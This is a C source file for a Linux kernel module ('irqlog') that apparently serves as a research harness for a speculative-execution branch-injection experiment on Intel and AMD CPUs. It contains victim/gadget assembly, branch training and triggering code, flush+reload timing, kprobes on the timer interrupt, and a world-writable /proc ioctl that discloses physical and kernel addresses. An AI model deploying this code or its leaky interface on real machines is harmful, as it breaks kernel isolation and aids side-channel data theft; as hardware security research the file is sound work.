#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/sched.h>
#include <linux/ptrace.h>
#include <linux/version.h>

#include <linux/mm.h>
#include <asm/pgtable.h>
#include <asm/page.h>

#include <linux/proc_fs.h>
#include <linux/fs.h>
#include <asm/nospec-branch.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <trace/events/syscalls.h>
#include <asm/asm.h> 

#define str(s) #s
#define xstr(s) str(s)

struct ptwalk {
        pgd_t *pgd;
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 11, 0)
        p4d_t *p4d;
#else
        unsigned long *p4d;
#endif
        pud_t *pud;
        pmd_t *pmd;
        pte_t *pte;
        unsigned valid;
};

volatile uint64_t k_userptr[5000] = {0};
volatile uint64_t safe_target_addr[5000] = {0};

uint64_t counter_syscall = 0;
uint64_t counter_victim = 0;
uint64_t counter_c_1 = 0;
uint64_t counter_c_2 = 0;

extern void victim_start(void);
extern void victim_end(void);


extern void the_jmp_1(void);
extern void the_jmp_2(void);

extern void victim_start_c_1(void);
extern void victim_end_c_1(void);

extern void victim_start_c_2(void);
extern void victim_end_c_2(void);

extern void victim_start(void);
extern void victim_end(void);

extern void gadget_start(void);
extern void gadget_end(void);
extern void clear_bhb_one(void);
extern void clear_bhb_one_end(void);
extern void clear_bhb_two(void);
extern void clear_bhb_two_end(void);
extern void safe_target(void);
extern void safe_target_end(void);
bool is_in_target_syscall(void);

asm(
    ".pushsection .text,\"ax\"\n\t"

    ".globl gadget_start\n\t"
    ".type  gadget_start, @function\n\t"
    "int3\n\t"
    ".align 0x1000\n\t"
#ifdef ZEN4
    ".rept 0xffb\n\t"
    "nop\n\t"
    ".endr\n\t"
#endif
    "gadget_start:\n\t"
    "endbr64\n\t"
    "nop\n\t"
    "nop\n\t"
    "nop\n\t"
    "movq 0x7777(%rdx), %rax\n\t"

    ANNOTATE_RETPOLINE_SAFE
    "ret\n\t"

    "gadget_end:\n\t"
    ".size gadget_start, gadget_end - gadget_start\n\t"
);

asm(
    ".pushsection .text,\"ax\"\n\t"

    ".globl safe_target\n\t"
    ".type  safe_target, @function\n\t"
    "safe_target:\n\t"
    "endbr64\n\t"

    "movq k_userptr+0x10(%rip), %rdx\n\t"
    "movq %rdx, k_userptr(%rip)\n\t"

    "xor %edx, %edx\n\t"

    ANNOTATE_RETPOLINE_SAFE
    "ret\n\t"

    "safe_target_end:\n\t"
    ".size safe_target, safe_target_end - safe_target\n\t"
);

asm(
    ".pushsection .text,\"ax\"\n\t"

    ".globl victim_start\n\t"
    ".type  victim_start, @function\n\t"
    "victim_start:\n\t"
    ".rept " xstr(VICTIM_NOPS) "\n\t"
    "nop\n\t"
    ".endr\n\t"

#ifdef VICTIM_MUL
    ".rept " xstr(VICTIM_MUL) "\n\t"
    "imul %rax, %rax\n\t"
    "nop\n\t"
    ".endr\n\t"
#endif

#if defined(ATTACK) && defined(AMD)
    "addq $0x70000, %rdx\n\t" //pointer has to go through here to be valid
#endif

    ANNOTATE_RETPOLINE_SAFE
    "ret\n\t"
    "victim_end:\n\t"
    ".size victim_start, victim_end - victim_start\n\t"

    ".popsection\n\t"
);

asm(
    ".pushsection .text,\"ax\"\n\t"
    ".globl clear_bhb_one\n\t"
    ".type  clear_bhb_one, @function\n\t"
    ".align 0x100000\n\t"
    ".rept 0x176000\n\t"
    "nop\n\t"
    ".endr\n\t"
    "clear_bhb_one:\n\t"

    "pushq %rbp\n\t"
    "mov %rsp, %rbp\n\t"
    "movl $1, %ecx\n\t"
#if !defined(CASCADE) && !defined(ZEN4)
    ANNOTATE_INTRA_FUNCTION_CALL
#endif
    "call 1f\n\t"
    "jmp 5f\n\t"
    ".align 64, 0xcc\n\t"
    ".skip 32 - (.Lret1 - 1f), 0xcc\n\t"
#if !defined(CASCADE) && !defined(ZEN4)
    ANNOTATE_INTRA_FUNCTION_CALL
#endif
    "1: call 2f\n\t"
    ".Lret1:\n\t"
    ANNOTATE_RETPOLINE_SAFE
    "ret\n\t"
    ".align 64, 0xcc\n\t"
    ".skip 32 - 18, 0xcc\n\t"
    "2:	movl $5, %eax\n\t"
    "3:	jmp 4f\n\t"
    "nop\n\t"
    "4:	sub $1, %eax\n\t"
    "jnz 3b\n\t"
    "sub $1, %ecx\n\t"
    "jnz 1b\n\t"
    ".Lret2:\n\t"
    ANNOTATE_RETPOLINE_SAFE
    "ret\n\t"
    "5: lfence\n\t"
    "pop %rbp\n\t"
    ANNOTATE_RETPOLINE_SAFE
    "ret\n\t"

    "clear_bhb_one_end:\n\t"
    ".size clear_bhb_one, clear_bhb_one_end - clear_bhb_one\n\t"

    ".popsection\n\t"
);

asm(
    ".pushsection .text,\"ax\"\n\t"
    ".globl clear_bhb_two\n\t"
    ".type  clear_bhb_two, @function\n\t"
    
    ".align 0x100000\n\t"

    ".rept 0x76000\n\t"
    "nop\n\t"
    ".endr\n\t"

    "clear_bhb_two:\n\t"

    "pushq %rbp\n\t"
    "mov %rsp, %rbp\n\t"
    "movl $5, %ecx\n\t"
#if !defined(CASCADE) && !defined(ZEN4)
    ANNOTATE_INTRA_FUNCTION_CALL
#endif
    "call 1f\n\t"
    "jmp 5f\n\t"
    ".align 64, 0xcc\n\t"
    ".skip 32 - (.Lrett1 - 1f), 0xcc\n\t"
#if !defined(CASCADE) && !defined(ZEN4)
    ANNOTATE_INTRA_FUNCTION_CALL
#endif
    "1: call 2f\n\t"
    ".Lrett1:\n\t"
    ANNOTATE_RETPOLINE_SAFE
    "ret\n\t"
    ".align 64, 0xcc\n\t"
    ".skip 32 - 18, 0xcc\n\t"
    "2:	movl $5, %eax\n\t"
    "3:	jmp 4f\n\t"
    "nop\n\t"
    "4:	sub $1, %eax\n\t"
    "jnz 3b\n\t"
    "sub $1, %ecx\n\t"
    "jnz 1b\n\t"
    ".Lrett2:\n\t"
    ANNOTATE_RETPOLINE_SAFE
    "ret\n\t"
    "5: lfence\n\t"
    "pop %rbp\n\t"
    ANNOTATE_RETPOLINE_SAFE
    "ret\n\t"

    "clear_bhb_two_end:\n\t"
    ".size clear_bhb_two, clear_bhb_two_end - clear_bhb_two\n\t"

    ".popsection\n\t"
);

asm(
    ".pushsection .text,\"ax\"\n\t"
    ".globl victim_start_c_1\n\t"
    ".type  victim_start_c_1, @function\n\t"

    ".align 0x100000\n\t"

    ".rept 0x0\n\t"
    "nop\n\t"
    ".endr\n\t"

     ".rept 0x0\n\t"
     "nop\n\t"
     ".endr\n\t"

    "victim_start_c_1:\n\t"

    "cld\n\t"
    "rep stosb\n\t"

    ".rept " xstr(VICTIM_NOPS) "\n\t"
    "nop\n\t"
    ".endr\n\t"

    "addq k_userptr+0x8(%rip), %rdx\n\t" //load address - 0x77777
    "addq $0x70000, %rdx\n\t" //pointer has to go through here to be valid

    "the_jmp_1:\n\t"
    ANNOTATE_RETPOLINE_SAFE
    "jmp *(%rbx)\n\t"

    "xor %edx, %edx\n\t"

    "victim_end_c_1:\n\t"
    ".size victim_start_c_1, victim_end_c_1 - victim_start_c_1\n\t"
    ".popsection\n\t"
);

asm(
    ".pushsection .text,\"ax\"\n\t"
    ".globl victim_start_c_2\n\t"
    ".type  victim_start_c_2, @function\n\t"

    ".align 0x100000\n\t"

//     ".rept 0x388e2\n\t"
//     "nop\n\t"
//     ".endr\n\t"

//     ".rept 0x800\n\t"
//     "nop\n\t"
//     ".endr\n\t"

    "victim_start_c_2:\n\t"

    "cld\n\t"
    "rep stosb\n\t"

    ".rept " xstr(VICTIM_NOPS) "\n\t"
    "nop\n\t"
    ".endr\n\t"
    
    "addq k_userptr(%rip), %rdx\n\t" //load address - 0x77777
    "addq $0x70020, %rdx\n\t" //pointer has to go through here to be valid

    "the_jmp_2:\n\t"
    ANNOTATE_RETPOLINE_SAFE
    "jmp *(%rbx)\n\t"

    "xor %edx, %edx\n\t"
    "victim_end_c_2:\n\t"
    ".size victim_start_c_2, victim_end_c_2 - victim_start_c_2\n\t"
    ".popsection\n\t"
);

static inline __attribute__((always_inline)) uint64_t rdtsc_(void) {
    uint64_t lo, hi;
    asm volatile ("CPUID\n\t"
            "RDTSC\n\t"
            "movq %%rdx, %0\n\t"
            "movq %%rax, %1\n\t" : "=r" (hi), "=r" (lo)::
            "%rax", "%rbx", "%rcx", "%rdx");
    return (hi << 32) | lo;
}

static inline __attribute__((always_inline)) uint64_t rdtscp_(void) {
    uint64_t lo, hi;
    asm volatile("RDTSCP\n\t"
            "movq %%rdx, %0\n\t"
            "movq %%rax, %1\n\t"
            "CPUID\n\t": "=r" (hi), "=r" (lo):: "%rax",
            "%rbx", "%rcx", "%rdx");
    return (hi << 32) | lo;
}

static inline __attribute__((always_inline)) uint64_t reload(unsigned long offset){
    __asm__ volatile("mfence\n");
    unsigned volatile char *p = (uint8_t *)offset;
    uint64_t t0 = rdtsc_();
    *(volatile unsigned char *)p;
    uint64_t dt = rdtscp_() - t0;
    return dt;
}

#define MMUCTL_PGD (1 << 0)
#define MMUCTL_P4D (1 << 1)
#define MMUCTL_PUD (1 << 2)
#define MMUCTL_PMD (1 << 3)
#define MMUCTL_PTE (1 << 4)

static pgd_t *pgd_base_from_cr3(void)
{
    unsigned long cr3;
    asm volatile("mov %%cr3, %0" : "=r"(cr3));
    phys_addr_t pgd_pa = cr3 & PHYSICAL_PAGE_MASK;   // mask PCID + flags
    return (pgd_t *)__va(pgd_pa);                     // PGD page is in direct map
}


int resolve_va(size_t addr, struct ptwalk *entry);

int resolve_va(size_t addr, struct ptwalk *entry){
        pgd_t *pgd;
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 11, 0)
        p4d_t *p4d;
#else
        size_t *p4d;
#endif
        pud_t *pud;
        pmd_t *pmd;
        pte_t *pte;

        if (!entry)
                return -EINVAL;

        entry->pgd = NULL;
        entry->p4d = NULL;
        entry->pud = NULL;
        entry->pmd = NULL;
        entry->pte = NULL;
        entry->valid = 0;

        if (!current->mm)
                return -EINVAL;

	if(addr & (0x1UL << 63)){
		pgd = pgd_base_from_cr3() + pgd_index(addr);
	}else{
        	pgd = pgd_offset(current->mm, addr);
	}

        if (pgd_none(*pgd) || pgd_bad(*pgd))
                goto err;

        entry->pgd = pgd;
        entry->valid |= MMUCTL_PGD;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 11, 0)
        p4d = p4d_offset(entry->pgd, addr);

        if (p4d_none(*p4d) || p4d_bad(*p4d))
                goto err;

        entry->p4d = p4d;
        entry->valid |= MMUCTL_P4D;

        pud = pud_offset(entry->p4d, addr);
#else
        pud = pud_offset(pgd, addr);
#endif

        if (pud_none(*pud) || pud_bad(*pud))
                goto err;

        entry->pud = pud;
        entry->valid |= MMUCTL_PUD;

        pmd = pmd_offset(pud, addr);

        entry->pmd = pmd;
        entry->valid |= MMUCTL_PMD;

        if (pmd_trans_huge(*pmd) || (pmd_val(*pmd) & _PAGE_PSE))
                return 0;

        pte = (pte_t *)pmd_page_vaddr(*pmd) + pte_index(addr);

        entry->pte = pte;
        entry->valid |= MMUCTL_PTE;

        return 0;

err:
        return -1;
}


static __always_inline void enable_bhi_and_ibhf(void)
{
    u64 val;

    rdmsrl(MSR_IA32_SPEC_CTRL, val);

    val |= (1ULL << 10);   // BHI_DIS_S

    wrmsrl(MSR_IA32_SPEC_CTRL, val);

    asm volatile(
        ".byte 0xF3, 0x48, 0x0F, 0x1E, 0xF8\n\t"
        ::: "memory"
    );

    val ^= (1ULL << 10);   // BHI_DIS_S
    wrmsrl(MSR_IA32_SPEC_CTRL, val);
}

/* ------------------------------------------------------------------ */

static long handle_ioctl(struct file *filp, unsigned int request, unsigned long argp)
{
        struct ptwalk walk;
        uint64_t userptr, v;
        int ret;

        if(request == 1001 || request == 1002){
                if (copy_from_user(&v, (void *)argp, sizeof(v)))
                        return -EFAULT;

                ret = resolve_va((size_t)v, &walk);
                if (ret)
                        return ret;

                if (walk.valid & MMUCTL_PTE) {
                        userptr = (pte_val(*walk.pte) & PTE_PFN_MASK) & PAGE_MASK;
                        userptr |= v & ~PAGE_MASK;

                } else if (walk.valid & MMUCTL_PMD) {
                        userptr = (pmd_val(*walk.pmd) & PTE_PFN_MASK) & PAGE_MASK;
                        userptr |= v & ~PAGE_MASK;

                } else {
                        userptr = -1;
                        return -EFAULT;
                }
                
                if(request == 1002){
                        k_userptr[0] = (uint64_t)__va(userptr) - 0x77777;
                	k_userptr[1] = (uint64_t)__va(userptr) + 0x2000 - 0x77777; //Point to different value for training
                        k_userptr[2] = k_userptr[0];
		}

                if (copy_to_user((void *)argp, &userptr, sizeof(userptr)))
                        return -EFAULT;

                return 0;
        }else if(request == 1003){
		asm volatile("clflush (%0)\n\t" :: "r"((unsigned long)&k_userptr[0]));	
	}else if(request == 1004){
		return reload((unsigned long)&k_userptr[0]);
	}
 

#ifdef ATTACK
#ifdef INTEL
	if (copy_from_user(&v, (void *)argp, sizeof(v)))
                        return -EFAULT;
        //Pretend we have executed for a while...
	asm volatile(
#ifdef CASCADE
     	    ".rept 4420\n\t"
#elif defined(ARROW)
	    ".rept 8300\n\t"
#endif
            "nop\n\t"
            ".endr\n\t"
        );

        if(v == 0){
		//Train
                asm(
                    "mov $0x41, %%al\n\t"
		    "mov $8192, %%rcx\n\t"
                    "movq %0, %%rbx\n\t"
		    "movq %1, %%rdi\n\t"
                    "xor %%edx, %%edx\n\t"
                    "call victim_start_c_1\n\t"
                :: "r"((uint64_t)&safe_target_addr[1]), "r"((uint64_t)&safe_target_addr[2]) : "rax", "rcx", "rdi", "rbx", "rdx"
                );
        }else{
                //Consume
                asm(
		    "mov $0x41, %%al\n\t"
		    "mov $8192, %%rcx\n\t"
		    "movq %0, %%rbx\n\t"
		    "movq %1, %%rdi\n\t"
		    "movq %2, %%rdx\n\t"
		    "call victim_start_c_2\n\t"
                :: "r"((uint64_t)&safe_target_addr[0]), "r"((uint64_t)&safe_target_addr[2]), "r"((uint64_t)v) : "rax", "rcx", "rdi", "rbx", "rdx"
                );
        }



#elif defined(AMD)
        asm(
            "mov $2, %%eax\n\t"
            "movq k_userptr(%%rip), %%rdx\n\t"
            "call victim_start\n\t"
            "xor %%edi, %%edi\n\t"
        ::: "rdx", "rax");
#endif
#else
        asm(
            "mov $2, %%eax\n\t"
            "call victim_start\n\t"
        ::: "rax");
#endif


    return 0;
}

#define TARGET_IOCTL_CMD 0x1234 

struct syscall_state {
    struct task_struct *active_task;
    bool is_monitored;
};

static DEFINE_PER_CPU(struct syscall_state, cpu_state);

/* Helper to be called by your other kprobes */
bool is_in_target_syscall(void) {
    struct syscall_state *state = this_cpu_ptr(&cpu_state);
    return state->is_monitored && state->active_task == current;
}
EXPORT_SYMBOL(is_in_target_syscall);

static int ioctl_pre_handler(struct kprobe *p, struct pt_regs *regs) {
    /* On x86_64, regs->di holds the pointer to the ACTUAL registers */
    struct pt_regs *real_regs = (struct pt_regs *)regs->di;

    /* check: Ensure real_regs is a valid kernel address range */
    if (!real_regs || (unsigned long)real_regs < 0xf000000000000000) {
        return 0; 
    }

    /* Extraction: .si is the 2nd argument (cmd) in the syscall */
    unsigned long cmd = real_regs->si; 

    if (cmd == TARGET_IOCTL_CMD) {
        struct syscall_state *state = this_cpu_ptr(&cpu_state);
        state->active_task = current;
        state->is_monitored = true;
    }
    return 0;
}

static int ioctl_ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs) {
    struct syscall_state *state = this_cpu_ptr(&cpu_state);
    
    if (state->active_task == current) {
        state->is_monitored = false;
        state->active_task = NULL;
    }
    return 0;
}

static struct kprobe kps = {
    .symbol_name = "__x64_sys_ioctl",
    .pre_handler = ioctl_pre_handler,
};

static struct kretprobe rps = {
    .handler = ioctl_ret_handler,
    .kp.symbol_name = "__x64_sys_ioctl",
    .maxactive = 100, 
};


static int handler_pre(struct kprobe *p, struct pt_regs *regs)
{
    struct pt_regs *irq_regs;

    irq_regs = (struct pt_regs *)regs->di;
    if (!irq_regs)
        return 0;

#if defined(ATTACK)
#if defined(INTEL)

#ifdef SABOTAGE
        k_userptr[0] = k_userptr[1];
#endif

    counter_c_1 += !!(irq_regs->ip >= victim_start_c_1 && irq_regs->ip < victim_end_c_1);
    counter_c_2 += !!(irq_regs->ip >= victim_start_c_2 && irq_regs->ip < victim_end_c_2);

#elif defined(AMD)
    if(irq_regs->ip >= victim_start && irq_regs->ip < victim_end){
        counter_victim++;
#ifdef SABOTAGE
	irq_regs->di += 0x1000; // Changing this will reduce your success rate to 0, proving interrupts are the driving factor
#endif
    }
#endif
#elif defined(PRECISE)
    if(irq_regs->ip >= victim_start && irq_regs->ip < victim_end){
        counter_victim++;
    }
#else
    if(is_in_target_syscall()){
        counter_syscall++;
    }
#endif

    return 0;
}

static struct kprobe kp = {
    .symbol_name = "__sysvec_apic_timer_interrupt",
    .pre_handler = handler_pre,
};

static struct proc_dir_entry *irqlog_proc;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,6,0)
static const struct proc_ops pops = {
        .proc_open         = nonseekable_open,
	.proc_lseek	   = noop_llseek,
        .proc_ioctl        = handle_ioctl,
#ifdef CONFIG_COMPAT
        .proc_compat_ioctl = handle_ioctl,
#endif
};
#else
static const struct file_operations pops = {
        .open           = nonseekable_open,
        .llseek         = no_llseek,
        .unlocked_ioctl = handle_ioctl,
#ifdef CONFIG_COMPAT
        .compat_ioctl   = handle_ioctl,
#endif
};
#endif

/* ------------------------------------------------------------------ */

static int __init irqlog_init(void)
{
    struct ptwalk walk;
    int ret;
    uint64_t victim_pa;

    safe_target_addr[0] = (uint64_t)safe_target;
    safe_target_addr[1] = (uint64_t)gadget_start;

    ret = register_kprobe(&kp);
    if (ret < 0) {
            pr_err("irqlog: register_kprobe failed %d\n", ret);
            return ret;
    }

    ret = register_kprobe(&kps);
    if (ret < 0) return ret;

    ret = register_kretprobe(&rps);
    if (ret < 0) {
        unregister_kprobe(&kp);
        return ret;
    }

    irqlog_proc = proc_create("irqlog", 0666, NULL, &pops);
    if (!irqlog_proc) {
            unregister_kprobe(&kp);
            return -ENOMEM;
    }

    pr_info("irqlog: ready. ioctl via /proc/irqlog\n");

    pr_info("handle_ioctl: %px\n", handle_ioctl);

    pr_info("gadget_start: %px\n", gadget_start);

    ret = resolve_va((size_t)victim_start, &walk);
    if (ret)
            return ret;

    if (walk.valid & MMUCTL_PTE) {
            victim_pa = (pte_val(*walk.pte) & PTE_PFN_MASK) & PAGE_MASK;
            victim_pa |= (uint64_t)victim_start & ~PAGE_MASK;

    } else if (walk.valid & MMUCTL_PMD) {
            victim_pa = (pmd_val(*walk.pmd) & PTE_PFN_MASK) & PAGE_MASK;
            victim_pa |= (uint64_t)victim_start & ~PAGE_MASK;

    } else {
            victim_pa = -1;
            return -EFAULT;
    }

    pr_info("victim_start: %px (PA: %px)\n", victim_start, victim_pa);
    pr_info("victim_end: %px\n", victim_end);

    ret = resolve_va((size_t)victim_start_c_1, &walk);
    if (ret)
            return ret;

    if (walk.valid & MMUCTL_PTE) {
            victim_pa = (pte_val(*walk.pte) & PTE_PFN_MASK) & PAGE_MASK;
            victim_pa |= (uint64_t)victim_start_c_1 & ~PAGE_MASK;

    } else if (walk.valid & MMUCTL_PMD) {
            victim_pa = (pmd_val(*walk.pmd) & PTE_PFN_MASK) & PAGE_MASK;
            victim_pa |= (uint64_t)victim_start_c_1 & ~PAGE_MASK;

    } else {
            victim_pa = -1;
            return -EFAULT;
    }

    pr_info("victim_start_c_1: %px (PA: %px)\n", victim_start_c_1, victim_pa); 

    ret = resolve_va((size_t)victim_start_c_2, &walk);
    if (ret)
            return ret;

    if (walk.valid & MMUCTL_PTE) {
            victim_pa = (pte_val(*walk.pte) & PTE_PFN_MASK) & PAGE_MASK;
            victim_pa |= (uint64_t)victim_start_c_2 & ~PAGE_MASK;

    } else if (walk.valid & MMUCTL_PMD) {
            victim_pa = (pmd_val(*walk.pmd) & PTE_PFN_MASK) & PAGE_MASK;
            victim_pa |= (uint64_t)victim_start_c_2 & ~PAGE_MASK;

    } else {
            victim_pa = -1;
            return -EFAULT;
    }

    pr_info("victim_start_c_2: %px (PA: %px)\n", victim_start_c_2, victim_pa);


    pr_info("the_jmp_1: %px\n", the_jmp_1);
    pr_info("the_jmp_2: %px\n", the_jmp_2);

    pr_info("clear_bhb_one: %px\n", clear_bhb_one);
    pr_info("clear_bhb_two: %px\n", clear_bhb_two);

    pr_info("handler_pre: %px\n", handler_pre);

    ret = resolve_va((size_t)&safe_target_addr[0], &walk);
    if (ret)
            return ret;

    if (walk.valid & MMUCTL_PTE) {
            victim_pa = (pte_val(*walk.pte) & PTE_PFN_MASK) & PAGE_MASK;
            victim_pa |= (uint64_t)&safe_target_addr[0] & ~PAGE_MASK;

    } else if (walk.valid & MMUCTL_PMD) {
            victim_pa = (pmd_val(*walk.pmd) & PTE_PFN_MASK) & PAGE_MASK;
            victim_pa |= (uint64_t)&safe_target_addr[0] & ~PAGE_MASK;

    } else {
            victim_pa = -1;
            return -EFAULT;
    }

    pr_info("k_userptr[0]: %px (PA: %px)\n", &safe_target_addr[0], victim_pa);

    return 0;
}

static void __exit irqlog_exit(void)
{
        if (irqlog_proc)
                remove_proc_entry("irqlog", NULL);
        unregister_kprobe(&kp);
        unregister_kprobe(&kps);
        unregister_kretprobe(&rps);
	pr_info("counter_syscall = %lu\n", counter_syscall);
	pr_info("counter_victim = %lu\n", counter_victim);
	pr_info("counter_c_1 = %lu\n", counter_c_1);
	pr_info("counter_c_2 = %lu\n", counter_c_2);
	pr_info("irqlog: unloaded\n");
}

module_init(irqlog_init);
module_exit(irqlog_exit);

MODULE_LICENSE("GPL");
